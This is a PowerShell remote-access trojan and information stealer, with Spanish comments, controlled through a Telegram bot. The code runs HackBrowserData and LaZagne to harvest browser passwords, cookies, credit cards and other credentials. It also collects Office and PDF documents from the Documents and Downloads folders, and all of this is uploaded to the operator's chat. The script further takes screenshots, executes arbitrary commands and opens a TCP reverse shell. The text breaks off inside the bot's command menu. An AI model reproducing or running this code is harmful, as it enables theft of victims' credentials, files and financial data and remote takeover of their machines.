param(
    [Parameter(Mandatory=$true)]
    [string]$Token,
    
    [Parameter(Mandatory=$true)] 
    [string]$ChatId
)

# === CONFIGURACION ===
$ApiUrl = "https://api.telegram.org/bot$Token"
$LogFile = "$env:APPDATA\CarpetaDos\bot.log"
$HackPath = "$env:APPDATA\CarpetaDos\hackbrowserdata.exe"
$LaZagnePath = "$env:APPDATA\CarpetaDos\lazagne.exe"
$StateFile = "$env:APPDATA\CarpetaDos\bot_state.json"

# Variables de sesion
$script:CurrentDir = $PWD.Path
$script:LastStealTime = $null
$script:ProcessedUpdates = @{}
$script:Lock = New-Object System.Object
$script:ReverseShellActive = $false
$script:ShellClient = $null
$script:ShellStream = $null
$script:FilesExfiltrated = $false
$script:HackBrowserDataCompleted = $false
$script:LaZagneCompleted = $false
$script:ArchivosHackBrowserDataEnviados = 0

New-Item -ItemType Directory -Path (Split-Path $LogFile) -Force -ErrorAction SilentlyContinue | Out-Null

# === FUNCIONES BASICAS ===
function Write-Log {
    param([string]$Message)
    $line = "[$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')] $Message"
    try { Add-Content -Path $LogFile -Value $line -ErrorAction SilentlyContinue } catch {}
    Write-Host $line
}

function Send-Message {
    param([string]$Text)
    try {
        if ($Text.Length -gt 4000) { $Text = $Text.Substring(0, 4000) + "`n...(truncado)" }
        $body = @{ chat_id = $ChatId; text = $Text } | ConvertTo-Json -Compress
        Invoke-RestMethod -Uri "$ApiUrl/sendMessage" -Method Post -ContentType "application/json" -Body $body | Out-Null
        return $true
    } catch {
        Write-Log "Error mensaje: $($_.Exception.Message)"
        return $false
    }
}

function Send-File {
    param([string]$Path, [string]$Caption = "")
    try {
        if (-not (Test-Path $Path)) { return $false }
        
        $args = @(
            "-s", "-X", "POST",
            "https://api.telegram.org/bot$Token/sendDocument",
            "-F", "chat_id=$ChatId",
            "-F", "document=@$Path"
        )
        if ($Caption) { $args += "-F", "caption=$Caption" }
        
        $result = & curl.exe @args 2>&1 | ConvertFrom-Json
        if ($result.ok) {
            Write-Log "Archivo enviado: $(Split-Path $Path -Leaf)"
            return $true
        }
        return $false
    } catch {
        Write-Log "Error archivo: $($_.Exception.Message)"
        return $false
    }
}

# === INFO DEL SISTEMA ===
function Get-Info {
    try {
        $ip = (Invoke-RestMethod -Uri 'https://api.ipify.org?format=json' -TimeoutSec 5).ip
    } catch { $ip = "Desconocida" }
    try {
        $os = (Get-CimInstance Win32_OperatingSystem).Caption
    } catch { $os = "Windows" }
    return "PC: $env:COMPUTERNAME | User: $env:USERNAME | IP: $ip | OS: $os"
}

# === SCREENSHOT ===
function Take-Screenshot {
    try {
        Add-Type -AssemblyName System.Windows.Forms, System.Drawing
        $screen = [System.Windows.Forms.Screen]::PrimaryScreen
        $bitmap = New-Object System.Drawing.Bitmap($screen.Bounds.Width, $screen.Bounds.Height)
        $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
        $graphics.CopyFromScreen($screen.Bounds.Location, [System.Drawing.Point]::Empty, $screen.Bounds.Size)
        
        $path = "$env:TEMP\ss_$(Get-Date -Format 'yyyyMMdd_HHmmss').png"
        $bitmap.Save($path, [System.Drawing.Imaging.ImageFormat]::Png)
        $graphics.Dispose()
        $bitmap.Dispose()
        
        Send-File -Path $path -Caption "Screenshot $(Get-Date -Format 'HH:mm:ss')"
        Remove-Item $path -Force -ErrorAction SilentlyContinue
        return $true
    } catch {
        Write-Log "Error screenshot: $($_.Exception.Message)"
        Send-Message -Text "Error capturando: $($_.Exception.Message)"
        return $false
    }
}

# === FASE 1: HACKBROWSERDATA (8 ARCHIVOS) ===
function Run-HackBrowserData-Phase {
    param([switch]$Auto = $false)
    
    if (-not (Test-Path $HackPath)) {
        Send-Message -Text "Error: hackbrowserdata.exe no encontrado"
        return $false
    }
    
    Send-Message -Text "=== FASE 1: HackBrowserData ===`nExtrayendo 8 tipos de datos..."
    Write-Log "FASE 1: Iniciando HackBrowserData - Objetivo: 8 archivos"
    
    $intentos = 0
    $maxIntentos = 5
    
    while ($script:ArchivosHackBrowserDataEnviados -lt 8 -and $intentos -lt $maxIntentos) {
        $intentos++
        Write-Log "HackBrowserData - Intento $intentos de $maxIntentos"
        
        # Cerrar navegadores
        $existing = Get-Process @("chrome","msedge","firefox","brave","opera") -ErrorAction SilentlyContinue | Select-Object -ExpandProperty Id
        
        $outDir = "$env:TEMP\hbd_$(Get-Date -Format 'yyyyMMdd_HHmmss')_$intentos"
        New-Item -ItemType Directory -Path $outDir -Force | Out-Null
        
        try {
            $p = Start-Process -FilePath $HackPath -ArgumentList "dump -d `"$outDir`" -f json" -PassThru -WindowStyle Hidden
            $p.WaitForExit(120000)
            if (-not $p.HasExited) { $p.Kill() }
            
            Start-Sleep -Seconds 2
            
            # Reabrir navegadores
            Get-Process @("chrome","msedge","firefox","brave","opera") -ErrorAction SilentlyContinue | Where-Object { $existing -notcontains $_.Id } | ForEach-Object {
                try { $_.Kill() } catch {}
            }
            
            # Definir los 8 tipos
            $tiposArchivos = @{
                "bookmarks" = "bookmark"
                "cookies" = "cookie"
                "downloads" = "download"
                "extensions" = "extension"
                "history" = "history"
                "localstorage" = "localstorage"
                "passwords" = "password"
                "creditcards" = "creditcard"
            }
            
            $allFiles = Get-ChildItem $outDir -Filter "*.json" -Recurse -ErrorAction SilentlyContinue
            
            if ($allFiles) {
                Write-Log "HackBrowserData encontro $($allFiles.Count) archivos JSON"
                
                # Crear directorios temporales
                $tempDirs = @{}
                foreach ($tipo in $tiposArchivos.Keys) {
                    $tempDir = "$env:TEMP\hbd_tipo_$tipo"
                    New-Item -ItemType Directory -Path $tempDir -Force | Out-Null
                    $tempDirs[$tipo] = $tempDir
                }
                
                # Clasificar archivos
                $archivosPorTipo = @{}
                foreach ($tipo in $tiposArchivos.Keys) {
                    $archivosPorTipo[$tipo] = @()
                }
                
                foreach ($file in $allFiles) {
                    $fileMatched = $false
                    foreach ($tipo in $tiposArchivos.Keys) {
                        if ($file.Name -like "*$tipo*") {
                            Copy-Item $file.FullName -Destination $tempDirs[$tipo] -Force
                            $archivosPorTipo[$tipo] += $file
                            $fileMatched = $true
                            break
                        }
                    }
                    if (-not $fileMatched) {
                        Copy-Item $file.FullName -Destination $tempDirs["localstorage"] -Force
                        $archivosPorTipo["localstorage"] += $file
                    }
                }
                
                # Crear y enviar los 8 ZIPs
                $zipIndex = 0
                foreach ($tipo in $tiposArchivos.Keys) {
                    $zipIndex++
                    $nombreZip = $tiposArchivos[$tipo]
                    $zipPath = "$env:TEMP\$nombreZip.zip"
                    $archivosEnTipo = $archivosPorTipo[$tipo]
                    
                    if ($archivosEnTipo.Count -gt 0) {
                        Compress-Archive -Path "$($tempDirs[$tipo])\*" -DestinationPath $zipPath -Force
                        $tamanoMB = [math]::Round((Get-Item $zipPath).Length / 1MB, 2)
                        $caption = "[$zipIndex/8] [$nombreZip.zip] HackBrowserData`nTipo: $($tiposArchivos[$tipo])`nArchivos: $($archivosEnTipo.Count)`nTamano: $tamanoMB MB`nPC: $env:COMPUTERNAME"
                        
                        if (Send-File -Path $zipPath -Caption $caption) {
                            $script:ArchivosHackBrowserDataEnviados++
                            Write-Log "HBD ZIP $nombreZip.zip ($zipIndex/8) enviado. Total: $($script:ArchivosHackBrowserDataEnviados)"
                        }
                    } else {
                        # ZIP vacio
                        $infoPath = "$env:TEMP\info_hbd_$tipo.txt"
                        $infoContent = @"
=== $nombreZip (HackBrowserData) ===
Fecha: $(Get-Date)
PC: $env:COMPUTERNAME
Tipo: $tipo
Estado: No se encontraron datos
"@
                        $infoContent | Out-File $infoPath -Encoding UTF8
                        Compress-Archive -Path $infoPath -DestinationPath $zipPath -Force
                        Remove-Item $infoPath -Force -ErrorAction SilentlyContinue
                        
                        $caption = "[$zipIndex/8] [$nombreZip.zip] HackBrowserData`nTipo: $($tiposArchivos[$tipo])`nEstado: Sin datos`nPC: $env:COMPUTERNAME"
                        
                        if (Send-File -Path $zipPath -Caption $caption) {
                            $script:ArchivosHackBrowserDataEnviados++
                            Write-Log "HBD ZIP vacio $nombreZip.zip ($zipIndex/8) enviado. Total: $($script:ArchivosHackBrowserDataEnviados)"
                        }
                    }
                    
                    Remove-Item $zipPath -Force -ErrorAction SilentlyContinue
                    Start-Sleep -Seconds 2
                }
                
                # Limpiar
                foreach ($dir in $tempDirs.Values) {
                    if (Test-Path $dir) { Remove-Item $dir -Recurse -Force -ErrorAction SilentlyContinue }
                }
            } else {
                Write-Log "HackBrowserData no encontro archivos"
                # Crear 8 ZIPs vacios
                $nombresFallback = @("bookmark", "cookie", "download", "extension", "history", "localstorage", "password", "creditcard")
                for ($i = 0; $i -lt 8; $i++) {
                    $nombreZip = $nombresFallback[$i]
                    $zipPath = "$env:TEMP\$nombreZip.zip"
                    $infoPath = "$env:TEMP\info_hbd_$nombreZip.txt"
                    
                    "=== $nombreZip (HackBrowserData) ===`nFecha: $(Get-Date)`nPC: $env:COMPUTERNAME`nEstado: Sin datos" | Out-File $infoPath -Encoding UTF8
                    Compress-Archive -Path $infoPath -DestinationPath $zipPath -Force
                    Remove-Item $infoPath -Force -ErrorAction SilentlyContinue
                    
                    if (Send-File -Path $zipPath -Caption "[$($i+1)/8] [$nombreZip.zip] HackBrowserData - Sin datos") {
                        $script:ArchivosHackBrowserDataEnviados++
                    }
                    Remove-Item $zipPath -Force -ErrorAction SilentlyContinue
                    Start-Sleep -Seconds 2
                }
            }
            
        } finally {
            if (Test-Path $outDir) { Remove-Item $outDir -Recurse -Force -ErrorAction SilentlyContinue }
        }
        
        if ($script:ArchivosHackBrowserDataEnviados -lt 8) {
            Write-Log "HackBrowserData: Faltan archivos ($($script:ArchivosHackBrowserDataEnviados)/8). Reintentando..."
            Send-Message -Text "HackBrowserData: Faltan $(8 - $script:ArchivosHackBrowserDataEnviados) archivos. Reintentando..."
            Start-Sleep -Seconds 5
        }
    }
    
    if ($script:ArchivosHackBrowserDataEnviados -ge 8) {
        $script:HackBrowserDataCompleted = $true
        Save-State
        Send-Message -Text "✅ FASE 1 COMPLETADA: HackBrowserData`n8 archivos enviados: bookmark, cookie, download, extension, history, localstorage, password, creditcard"
        Write-Log "FASE 1 COMPLETADA: 8 archivos de HackBrowserData enviados"
        return $true
    } else {
        Send-Message -Text "❌ FASE 1 INCOMPLETA: HackBrowserData solo envio $($script:ArchivosHackBrowserDataEnviados)/8"
        Write-Log "FASE 1 FALLIDA: Solo se enviaron $($script:ArchivosHackBrowserDataEnviados)/8"
        return $false
    }
}

# === FASE 2: LAZAGNE (TODOS LOS MODULOS) - CORREGIDO ===
function Run-LaZagne-Phase {
    param([switch]$Auto = $false)
    
    if (-not (Test-Path $LaZagnePath)) {
        Send-Message -Text "Error: LaZagne.exe no encontrado"
        return $false
    }
    
    Send-Message -Text "=== FASE 2: LaZagne ===`nExtrayendo TODOS los modulos...`n`nModulos disponibles:`n- browsers (Chrome, Firefox, Edge, Opera, Brave, etc.)`n- chats`n- databases`n- games`n- git`n- mails`n- maven`n- memory`n- multimedia`n- php`n- svn`n- sysadmin`n- windows`n- wifi`n- unused"
    Write-Log "FASE 2: Iniciando LaZagne - Todos los modulos"
    
    $outDir = "$env:TEMP\lazagne_$(Get-Date -Format 'yyyyMMdd_HHmmss')"
    New-Item -ItemType Directory -Path $outDir -Force | Out-Null
    
    $modulos = @(
        @{ Nombre = "browsers"; Descripcion = "Navegadores (Chrome, Firefox, Edge, Opera, Brave)" }
        @{ Nombre = "chats"; Descripcion = "Chats" }
        @{ Nombre = "databases"; Descripcion = "Bases de datos" }
        @{ Nombre = "games"; Descripcion = "Juegos" }
        @{ Nombre = "git"; Descripcion = "Git" }
        @{ Nombre = "mails"; Descripcion = "Correos" }
        @{ Nombre = "maven"; Descripcion = "Maven" }
        @{ Nombre = "memory"; Descripcion = "Memoria" }
        @{ Nombre = "multimedia"; Descripcion = "Multimedia" }
        @{ Nombre = "php"; Descripcion = "PHP" }
        @{ Nombre = "svn"; Descripcion = "SVN" }
        @{ Nombre = "sysadmin"; Descripcion = "Sysadmin" }
        @{ Nombre = "windows"; Descripcion = "Windows" }
        @{ Nombre = "wifi"; Descripcion = "WiFi" }
        @{ Nombre = "unused"; Descripcion = "Otros" }
    )
    
    $totalModulos = $modulos.Count
    $modulosExitosos = 0
    $modulosConDatos = 0
    
    for ($i = 0; $i -lt $modulos.Count; $i++) {
        $modulo = $modulos[$i]
        $numero = $i + 1
        
        Write-Log "LaZagne: Ejecutando modulo $($modulo.Nombre) ($numero/$totalModulos)"
        
        try {
            $outputFile = "$outDir\lazagne_$($modulo.Nombre).txt"
            
            # CORRECCION: Usar -RedirectStandardOutput para capturar la salida de consola
            $p = Start-Process -FilePath $LaZagnePath `
                -ArgumentList $modulo.Nombre `
                -RedirectStandardOutput $outputFile `
                -RedirectStandardError "$outDir\lazagne_$($modulo.Nombre)_err.txt" `
                -PassThru -WindowStyle Hidden
            
            $p.WaitForExit(60000)
            if (-not $p.HasExited) { 
                $p.Kill() 
                Write-Log "LaZagne modulo $($modulo.Nombre): Timeout - proceso terminado"
            }
            
            # Esperar a que el archivo se escriba completamente
            Start-Sleep -Seconds 2
            
            if (Test-Path $outputFile) {
                $size = (Get-Item $outputFile).Length
                $content = Get-Content $outputFile -Raw -ErrorAction SilentlyContinue
                
                Write-Log "LaZagne modulo $($modulo.Nombre): Archivo generado - $size bytes"
                
                # Verificar si tiene datos reales (no solo el banner)
                $tieneDatos = $content -match "Password found|password found|\[\+]" -and ($content.Length -gt 200)
                
                if ($tieneDatos) {
                    $modulosConDatos++
                    $tamanoMB = [math]::Round($size / 1MB, 2)
                    
                    # Comprimir el archivo
                    $zipPath = "$env:TEMP\lazagne_$($modulo.Nombre).zip"
                    Compress-Archive -Path $outputFile -DestinationPath $zipPath -Force
                    
                    $caption = "[$numero/$totalModulos] [LaZagne] $($modulo.Descripcion)`nModulo: $($modulo.Nombre)`nTamano: $tamanoMB MB`nEstado: ✅ CON DATOS`nPC: $env:COMPUTERNAME"
                    
                    if (Send-File -Path $zipPath -Caption $caption) {
                        $modulosExitosos++
                        Write-Log "LaZagne modulo $($modulo.Nombre) enviado con datos"
                    } else {
                        Write-Log "ERROR enviando modulo $($modulo.Nombre)"
                    }
                    
                    Remove-Item $zipPath -Force -ErrorAction SilentlyContinue
                } else {
                    Write-Log "LaZagne modulo $($modulo.Nombre): Sin datos relevantes (solo banner o vacio)"
                    # Enviar de todos modos pero marcando que esta vacio
                    $zipPath = "$env:TEMP\lazagne_$($modulo.Nombre)_vacio.zip"
                    Compress-Archive -Path $outputFile -DestinationPath $zipPath -Force
                    
                    $caption = "[$numero/$totalModulos] [LaZagne] $($modulo.Descripcion)`nModulo: $($modulo.Nombre)`nEstado: ⚪ Sin datos`nPC: $env:COMPUTERNAME"
                    Send-File -Path $zipPath -Caption $caption | Out-Null
                    Remove-Item $zipPath -Force -ErrorAction SilentlyContinue
                    $modulosExitosos++
                }
            } else {
                Write-Log "LaZagne modulo $($modulo.Nombre): No se genero archivo de salida"
                # Crear archivo informativo de error
                $errorContent = "=== LaZagne Modulo: $($modulo.Nombre) ===`nFecha: $(Get-Date)`nPC: $env:COMPUTERNAME`nEstado: ERROR - No se genero archivo de salida`n`nNota: LaZagne escribe a stdout, puede que no haya encontrado datos o haya un error de ejecucion."
                $errorContent | Out-File $outputFile -Encoding UTF8
            }
        } catch {
            Write-Log "Error en modulo $($modulo.Nombre): $_"
            # Crear archivo de error
            $errorFile = "$outDir\lazagne_$($modulo.Nombre)_error.txt"
            "Error ejecutando modulo $($modulo.Nombre): $_" | Out-File $errorFile -Encoding UTF8
        }
        
        Start-Sleep -Seconds 2
    }
    
    # Ejecutar tambien 'all' para obtener todo junto
    Write-Log "LaZagne: Ejecutando modulo 'all' para respaldo completo..."
    Send-Message -Text "Generando respaldo completo con 'all'..."
    
    try {
        $allOutput = "$outDir\lazagne_all.txt"
        $p = Start-Process -FilePath $LaZagnePath `
            -ArgumentList "all" `
            -RedirectStandardOutput $allOutput `
            -RedirectStandardError "$outDir\lazagne_all_err.txt" `
            -PassThru -WindowStyle Hidden
        
        $p.WaitForExit(120000)
        if (-not $p.HasExited) { $p.Kill() }
        
        Start-Sleep -Seconds 2
        
        if (Test-Path $allOutput) {
            $size = (Get-Item $allOutput).Length
            if ($size -gt 500) {
                $zipPath = "$env:TEMP\lazagne_all.zip"
                Compress-Archive -Path $allOutput -DestinationPath $zipPath -Force
                $tamanoMB = [math]::Round($size / 1MB, 2)
                
                $caption = "[EXTRA] [LaZagne] Respaldo COMPLETO (all)`nModulos: Todos`nTamano: $tamanoMB MB`nEstado: ✅ COMPLETO`nPC: $env:COMPUTERNAME"
                Send-File -Path $zipPath -Caption $caption | Out-Null
                Remove-Item $zipPath -Force -ErrorAction SilentlyContinue
                Write-Log "LaZagne 'all' enviado correctamente"
            } else {
                Write-Log "LaZagne 'all': Archivo muy pequeno, posiblemente sin datos"
            }
        } else {
            Write-Log "LaZagne 'all': No se genero archivo"
        }
    } catch {
        Write-Log "Error en modulo 'all': $_"
    }
    
    # Limpiar
    if (Test-Path $outDir) { Remove-Item $outDir -Recurse -Force -ErrorAction SilentlyContinue }
    
    $script:LaZagneCompleted = $true
    Save-State
    
    Send-Message -Text "✅ FASE 2 COMPLETADA: LaZagne`nModulos ejecutados: $totalModulos`nCon datos: $modulosConDatos`nEnviados: $modulosExitosos`n`nNavegadores soportados:`nChrome, Chromium, Firefox, Opera, Opera GX, Edge, Brave, Safari, Vivaldi, Yandex, Torch, Comodo, Cyberfox, Flock, IceCat, IceDragon, K-Meleon, PaleMoon, SeaMonkey, Waterfox, etc."
    Write-Log "FASE 2 COMPLETADA: LaZagne - $modulosConDatos/$totalModulos con datos"
    
    return $true
}

# === FASE 3: DOCUMENTOS ===
function Exfiltrate-Documents {
    param([switch]$Auto = $false)
    
    Send-Message -Text "=== FASE 3: Documentos ===`nBuscando en Documentos y Descargas (con subcarpetas)...`nOrden: Word -> PDF -> Excel -> PowerPoint"
    Write-Log "FASE 3: Iniciando exfiltracion de documentos"
    
    $RutaDocumentos = [Environment]::GetFolderPath([Environment+SpecialFolder]::MyDocuments)
    $RutaDescargas = (New-Object -ComObject Shell.Application).Namespace('shell:Downloads').Self.Path
    
    $carpetasBusqueda = @()
    if (Test-Path $RutaDocumentos) { $carpetasBusqueda += $RutaDocumentos }
    if (Test-Path $RutaDescargas) { $carpetasBusqueda += $RutaDescargas }
    
    if ($carpetasBusqueda.Count -eq 0) {
        Send-Message -Text "No se encontraron carpetas"
        $script:FilesExfiltrated = $true
        Save-State
        return
    }
    
    $PrioridadWord = @('*.docx', '*.doc')
    $PrioridadPDF = @('*.pdf')
    $PrioridadExcel = @('*.xlsx', '*.xls')
    $PrioridadPowerPoint = @('*.pptx', '*.ppt')
    
    $archivosWord = @()
    $archivosPDF = @()
    $archivosExcel = @()
    $archivosPowerPoint = @()
    
    foreach ($carpeta in $carpetasBusqueda) {
        try {
            $archivosWord += Get-ChildItem -Path $carpeta -Include $PrioridadWord -Recurse -File -ErrorAction SilentlyContinue
            $archivosPDF += Get-ChildItem -Path $carpeta -Include $PrioridadPDF -Recurse -File -ErrorAction SilentlyContinue
            $archivosExcel += Get-ChildItem -Path $carpeta -Include $PrioridadExcel -Recurse -File -ErrorAction SilentlyContinue
            $archivosPowerPoint += Get-ChildItem -Path $carpeta -Include $PrioridadPowerPoint -Recurse -File -ErrorAction SilentlyContinue
        } catch {}
    }
    
    $totalArchivos = $archivosWord.Count + $archivosPDF.Count + $archivosExcel.Count + $archivosPowerPoint.Count
    
    if ($totalArchivos -eq 0) {
        Send-Message -Text "No se encontraron documentos."
        $script:FilesExfiltrated = $true
        Save-State
        return
    }
    
    Send-Message -Text "Total documentos: $totalArchivos`nWord: $($archivosWord.Count) | PDF: $($archivosPDF.Count) | Excel: $($archivosExcel.Count) | PPT: $($archivosPowerPoint.Count)"
    
    $enviados = 0
    $errores = 0
    
    # WORD
    if ($archivosWord.Count -gt 0) {
        Send-Message -Text "=== ENVIANDO WORD ==="
        foreach ($archivo in $archivosWord | Sort-Object FullName) {
            $enviados++
            $tamanoMB = [math]::Round($archivo.Length / 1MB, 2)
            $caption = "[$enviados/$totalArchivos] [WORD] $($archivo.Name)`nTamano: $tamanoMB MB`nCarpeta: $($archivo.DirectoryName)"
            if (Send-File -Path $archivo.FullName -Caption $caption) { Write-Log "OK Word: $($archivo.Name)" } else { $errores++ }
            Start-Sleep -Seconds 2
        }
    }
    
    # PDF
    if ($archivosPDF.Count -gt 0) {
        Send-Message -Text "=== ENVIANDO PDF ==="
        foreach ($archivo in $archivosPDF | Sort-Object FullName) {
            $enviados++
            $tamanoMB = [math]::Round($archivo.Length / 1MB, 2)
            $caption = "[$enviados/$totalArchivos] [PDF] $($archivo.Name)`nTamano: $tamanoMB MB`nCarpeta: $($archivo.DirectoryName)"
            if (Send-File -Path $archivo.FullName -Caption $caption) { Write-Log "OK PDF: $($archivo.Name)" } else { $errores++ }
            Start-Sleep -Seconds 2
        }
    }
    
    # EXCEL
    if ($archivosExcel.Count -gt 0) {
        Send-Message -Text "=== ENVIANDO EXCEL ==="
        foreach ($archivo in $archivosExcel | Sort-Object FullName) {
            $enviados++
            $tamanoMB = [math]::Round($archivo.Length / 1MB, 2)
            $caption = "[$enviados/$totalArchivos] [EXCEL] $($archivo.Name)`nTamano: $tamanoMB MB`nCarpeta: $($archivo.DirectoryName)"
            if (Send-File -Path $archivo.FullName -Caption $caption) { Write-Log "OK Excel: $($archivo.Name)" } else { $errores++ }
            Start-Sleep -Seconds 2
        }
    }
    
    # POWERPOINT
    if ($archivosPowerPoint.Count -gt 0) {
        Send-Message -Text "=== ENVIANDO POWERPOINT ==="
        foreach ($archivo in $archivosPowerPoint | Sort-Object FullName) {
            $enviados++
            $tamanoMB = [math]::Round($archivo.Length / 1MB, 2)
            $caption = "[$enviados/$totalArchivos] [POWERPOINT] $($archivo.Name)`nTamano: $tamanoMB MB`nCarpeta: $($archivo.DirectoryName)"
            if (Send-File -Path $archivo.FullName -Caption $caption) { Write-Log "OK PowerPoint: $($archivo.Name)" } else { $errores++ }
            Start-Sleep -Seconds 2
        }
    }
    
    $script:FilesExfiltrated = $true
    Save-State
    
    Send-Message -Text "✅ FASE 3 COMPLETADA: Documentos`nTotal: $totalArchivos | Exitosos: $($enviados - $errores) | Errores: $errores"
    Write-Log "FASE 3 COMPLETADA: Documentos - Exitosos: $($enviados - $errores), Errores: $errores"
}

# === REVERSE SHELL ===
function Start-ReverseShell {
    param([string]$IPAddress, [int]$Port = 4444)
    try {
        Send-Message -Text "Conectando a $IPAddress`:$Port ..."
        $script:ReverseShellActive = $true
        $client = New-Object System.Net.Sockets.TCPClient($IPAddress, $Port)
        $script:ShellClient = $client
        $stream = $client.GetStream()
        $script:ShellStream = $stream
        $writer = New-Object System.IO.StreamWriter($stream)
        $reader = New-Object System.IO.StreamReader($stream)
        $writer.AutoFlush = $true
        $writer.WriteLine("=== Reverse Shell Conectado ===`nUsuario: $env:USERNAME`nEquipo: $env:COMPUTERNAME")
        
        while ($script:ReverseShellActive -and $client.Connected) {
            $writer.Write("PS $(Get-Location)> ")
            try {
                $command = $reader.ReadLine()
                if ($command -eq "exit") { break }
                if (-not [string]::IsNullOrWhiteSpace($command)) {
                    try {
                        $output = Invoke-Expression $command 2>&1 | Out-String
                        $writer.WriteLine($output)
                    } catch { $writer.WriteLine("Error: $_") }
                }
            } catch { break }
        }
    } catch {
        Send-Message -Text "Error reverse shell: $_"
    } finally {
        if ($script:ShellStream) { $script:ShellStream.Close() }
        if ($script:ShellClient) { $script:ShellClient.Close() }
        $script:ReverseShellActive = $false
        Send-Message -Text "Reverse shell desconectado."
    }
}

function Stop-ReverseShell {
    $script:ReverseShellActive = $false
    if ($script:ShellStream) { $script:ShellStream.Close() }
    if ($script:ShellClient) { $script:ShellClient.Close() }
    Send-Message -Text "Reverse shell detenido."
}

# === EJECUTAR COMANDO ===
function Run-Command {
    param([string]$Cmd)
    Write-Log "Ejecutando: $Cmd"
    try {
        $psi = New-Object System.Diagnostics.ProcessStartInfo
        $psi.FileName = "cmd.exe"
        $psi.Arguments = "/c $Cmd && cd"
        $psi.WorkingDirectory = $script:CurrentDir
        $psi.RedirectStandardOutput = $true
        $psi.RedirectStandardError = $true
        $psi.UseShellExecute = $false
        $psi.CreateNoWindow = $true
        
        $proc = [System.Diagnostics.Process]::Start($psi)
        $stdout = $proc.StandardOutput.ReadToEnd()
        $stderr = $proc.StandardError.ReadToEnd()
        $proc.WaitForExit()
        
        if ($Cmd -match '^cd\s+(.+)$') {
            $newPath = $Matches[1]
            $testPath = if ([System.IO.Path]::IsPathRooted($newPath)) { $newPath } else { Join-Path $script:CurrentDir $newPath }
            $resolved = Resolve-Path $testPath -ErrorAction SilentlyContinue
            if ($resolved) {
                $script:CurrentDir = $resolved.Path
                Send-Message -Text "Directorio: $script:CurrentDir"
                return
            }
        }
        
        $output = $stdout + $stderr
        if ([string]::IsNullOrWhiteSpace($output)) { $output = "(sin salida)" }
        
        $temp = "$env:TEMP\cmd_$(Get-Date -Format 'yyyyMMdd_HHmmss').txt"
        "Comando: $Cmd`nDir: $script:CurrentDir`n$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')`n$('='*50)`n`n$output" | Out-File $temp -Encoding UTF8
        Send-File -Path $temp -Caption "Salida: $Cmd"
        Remove-Item $temp -Force -ErrorAction SilentlyContinue
    } catch {
        Send-Message -Text "Error: $($_.Exception.Message)"
    }
}

# === ESTADO ===
function Save-State {
    $state = @{
        LastStealTime = if ($script:LastStealTime) { $script:LastStealTime.ToString("o") } else { $null }
        FilesExfiltrated = $script:FilesExfiltrated
        HackBrowserDataCompleted = $script:HackBrowserDataCompleted
        LaZagneCompleted = $script:LaZagneCompleted
        ArchivosHackBrowserDataEnviados = $script:ArchivosHackBrowserDataEnviados
    }
    $state | ConvertTo-Json | Out-File $StateFile -Encoding UTF8
}

function Load-State {
    if (Test-Path $StateFile) {
        try {
            $state = Get-Content $StateFile | ConvertFrom-Json
            if ($state.LastStealTime) { $script:LastStealTime = [DateTime]::Parse($state.LastStealTime) }
            if ($state.FilesExfiltrated -ne $null) { $script:FilesExfiltrated = $state.FilesExfiltrated }
            if ($state.HackBrowserDataCompleted -ne $null) { $script:HackBrowserDataCompleted = $state.HackBrowserDataCompleted }
            if ($state.LaZagneCompleted -ne $null) { $script:LaZagneCompleted = $state.LaZagneCompleted }
            if ($state.ArchivosHackBrowserDataEnviados -ne $null) { $script:ArchivosHackBrowserDataEnviados = $state.ArchivosHackBrowserDataEnviados }
        } catch {}
    }
}

# === FLUJO AUTOMATICO ===
function Check-AutoSteal {
    $now = Get-Date
    
    # Verificar si han pasado 14 dias para reiniciar ciclo completo
    if ($script:LastStealTime -and ($now - $script:LastStealTime).Days -ge 14) {
        Write-Log "Han pasado 14 dias - REINICIANDO CICLO COMPLETO..."
        Send-Message -Text "🔄 Han pasado 14 dias - Reiniciando ciclo completo..."
        $script:HackBrowserDataCompleted = $false
        $script:LaZagneCompleted = $false
        $script:FilesExfiltrated = $false
        $script:ArchivosHackBrowserDataEnviados = 0
        $script:LastStealTime = $null
        Save-State
        Start-Sleep -Seconds 3
    }
    
    # FASE 1: HackBrowserData (8 archivos)
    if (-not $script:HackBrowserDataCompleted) {
        Write-Log "Iniciando FASE 1: HackBrowserData"
        $success = Run-HackBrowserData-Phase -Auto
        if (-not $success) {
            Write-Log "FASE 1 fallo, reintentando en proximo ciclo..."
            return
        }
        Start-Sleep -Seconds 5
    }
    
    # FASE 2: LaZagne (todos los modulos)
    if ($script:HackBrowserDataCompleted -and -not $script:LaZagneCompleted) {
        Write-Log "Iniciando FASE 2: LaZagne"
        Run-LaZagne-Phase -Auto
        Start-Sleep -Seconds 5
    }
    
    # FASE 3: Documentos
    if ($script:HackBrowserDataCompleted -and $script:LaZagneCompleted -and -not $script:FilesExfiltrated) {
        Write-Log "Iniciando FASE 3: Documentos"
        Exfiltrate-Documents -Auto
        if ($script:FilesExfiltrated) {
            $script:LastStealTime = Get-Date
            Save-State
            Send-Message -Text "🎉 CICLO COMPLETO FINALIZADO`n`nProximo ciclo en 14 dias.`n`nEl bot ahora acepta comandos:`n/cmd, /steal, /files, /captura, /shell, etc."
            Write-Log "CICLO COMPLETO FINALIZADO - Proximo ciclo en 14 dias"
        }
    }
}

# === PROCESAR COMANDOS ===
function Process-Cmd {
    param([string]$Text, [int]$UpdateId)
    
    [void][System.Threading.Monitor]::Enter($script:Lock)
    try {
        if ($script:ProcessedUpdates.ContainsKey($UpdateId)) { return }
        $script:ProcessedUpdates[$UpdateId] = $true
        if ($script:ProcessedUpdates.Count -gt 100) {
            $keys = $script:ProcessedUpdates.Keys | Sort-Object | Select-Object -First 50
            foreach ($k in $keys) { $script:ProcessedUpdates.Remove($k) }
        }
    } finally {
        [System.Threading.Monitor]::Exit($script:Lock)
    }
    
    Write-Log "Procesando: $Text"
    $parts = $Text.Trim() -split '\s+', 2
    $cmd = $parts[0].ToLower()
    $args = if ($parts.Count -gt 1) { $parts[1] } else { "" }
    
    switch ($cmd) {
        "/help" {
            Send-Message -Text @"
🤖 COMANDOS DISPONIBLES:

📋 INFORMACION:
/info - Info del sistema
/pwd - Directorio actual
/ls - Listar archivos
/cd <ruta> - Cambiar directorio

⚡ ACCIONES:
/captura - Screenshot
/cmd <comando> - Ejecutar comando

🔓 EXTRACCION:
/steal - Forzar ciclo completo (HackBrowserData + LaZagne + Documentos)
/hack - Solo HackBrowserData (8 archivos)
/lazagne - Solo LaZagne (todos los modulos)
/files - Solo Documentos

🌐 REVERSE SHELL:
/shell <IP> [puerto] - Conectar reverse shell
